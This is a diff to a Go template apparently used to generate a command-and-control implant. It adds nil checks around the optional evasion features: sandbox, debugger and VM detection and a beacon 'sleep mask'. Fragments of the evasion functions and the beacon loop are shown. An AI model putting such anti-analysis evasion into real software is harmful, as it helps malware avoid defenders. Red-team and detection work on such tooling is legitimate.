@@ -551,7 +551,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
-	"time"{{if or .Evasion.EnableSandboxDetection .Evasion.EnableDebuggerCheck .Evasion.EnableVMDetection}}
+	"time"{{if and .Evasion (or .Evasion.EnableSandboxDetection .Evasion.EnableDebuggerCheck .Evasion.EnableVMDetection)}}
 	"unsafe"
 	
 	"golang.org/x/sys/windows"{{end}}
@@ -588,7 +588,7 @@ func main() {
 		os.Exit(1)
 	}
 	
-	{{if .Evasion.EnableSandboxDetection}}
+	{{if and .Evasion .Evasion.EnableSandboxDetection}}
 	// Sandbox detection
 	if checkSandbox() {
 		{{if .Debug}}
@@ -598,7 +598,7 @@ func main() {
 	}
 	{{end}}
 	
-	{{if .Evasion.EnableDebuggerCheck}}
+	{{if and .Evasion .Evasion.EnableDebuggerCheck}}
 	// Debugger detection
 	if checkDebugger() {
 		{{if .Debug}}
@@ -608,7 +608,7 @@ func main() {
 	}
 	{{end}}
 	
-	{{if .Evasion.EnableVMDetection}}
+	{{if and .Evasion .Evasion.EnableVMDetection}}
 	// VM detection
 	if checkVM() {
 		{{if .Debug}}
@@ -637,7 +637,7 @@ func main() {
 		{{if .Debug}}
 		fmt.Printf("[DEBUG] Sleeping for %.2fs before next beacon (delay=%.2f, jitter=%.2f%%)\n", sleepSeconds, currentDelay, currentJitter*100)
 		{{end}}
-		{{if .Evasion.SleepMask}}
+		{{if and .Evasion .Evasion.SleepMask}}
 		// Sleep mask evasion
 		sleepMask(sleepDuration)
 		{{else}}
@@ -646,7 +646,7 @@ func main() {
 	}
 }
 
-{{if .Evasion.EnableSandboxDetection}}
+{{if and .Evasion .Evasion.EnableSandboxDetection}}
 func checkSandbox() bool {
 	// Basic checks
 	if runtime.NumCPU() < 2 {
@@ -790,7 +790,7 @@ func checkVMFiles() bool {
 }
 {{end}}
 
-{{if .Evasion.EnableDebuggerCheck}}
+{{if and .Evasion .Evasion.EnableDebuggerCheck}}
 func checkDebugger() bool {
 	// Check for common debugger processes (Windows)
 	if runtime.GOOS == "windows" {
@@ -815,7 +815,7 @@ func checkDebugger() bool {
 }
 {{end}}
 
-{{if .Evasion.EnableVMDetection}}
+{{if and .Evasion .Evasion.EnableVMDetection}}
 func checkVM() bool {
 	if runtime.GOOS == "windows" {
 		// Check registry for VM artifacts
@@ -857,7 +857,7 @@ func checkVM() bool {
 }
 {{end}}
 
-{{if .Evasion.SleepMask}}
+{{if and .Evasion .Evasion.SleepMask}}
 func sleepMask(duration time.Duration) {
 	// Sleep mask evasion - split sleep into smaller chunks with jitter
 	chunks := int(duration.Milliseconds() / 100)
